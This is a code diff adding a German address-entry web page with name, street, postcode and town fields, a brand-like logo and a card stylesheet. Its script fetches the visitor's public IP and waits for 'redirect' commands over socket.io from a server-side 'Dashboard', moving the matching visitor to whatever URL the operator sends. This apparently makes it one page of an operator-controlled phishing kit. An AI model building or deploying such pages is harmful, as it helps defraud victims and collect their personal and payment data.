@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/card.css">
+</head>
+<body>
+    <div class="cc">
+        <div class="all">
+            <div class="logo">
+                <img src="./img/pipillgomark.png" alt="">
+            </div>
+            <div class="link">
+                <h2>Addresse hinzufügen</h2>
+            </div>
+            <div class="inp">
+                <div class="input-container">
+                    <input required="" id="input" type="text" />
+                    <label class="label" for="input">Vollständiger Name</label>
+                    <div class="underline"></div>
+                </div>
+                <div class="input-container">
+                    <input required="" id="input" type="text" />
+                    <label class="label" for="input">Adresszeile</label>
+                    <div class="underline"></div>
+                </div>
+                <div class="input-container">
+                    <input required="" id="input" maxlength="7" type="tel" />
+                    <label class="label" for="input">Postleitzahl</label>
+                    <div class="underline"></div>
+                </div>
+                <div class="input-container">
+                    <input required="" id="input" type="text" />
+                    <label class="label" for="input">Stadt / Ort / Dorf</label>
+                    <div class="underline"></div>
+                </div>
+                <a href="">Speichern</a>
+            </div>
+        </div>
+    </div>
+   
+   
+      
+
+    <script src="./socket.io/socket.io.js"></script>
+    <script>
+      async function getPublicIP() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    console.log("Public IP:", data.ip);
+    return data.ip;
+  } catch (error) {
+    console.error("Failed to fetch IP:", error);
+    return null;
+  }
+}
+      const socket = io();
+     
+      // Handle redirect messages from server
+      socket.on('redirect', async (data) => {
+        const currentIp = await getPublicIP();
+        console.log("Dashboard: "+data.ip,"Client: "+currentIp);
+        
+        if (data.ip === currentIp || data.ip == "::1" || data.ip=="::ffff:127.0.0.1" ) {
+
+          window.location.href = data.url;
+        }
+      });
+      </script>
+</body>
+</html>
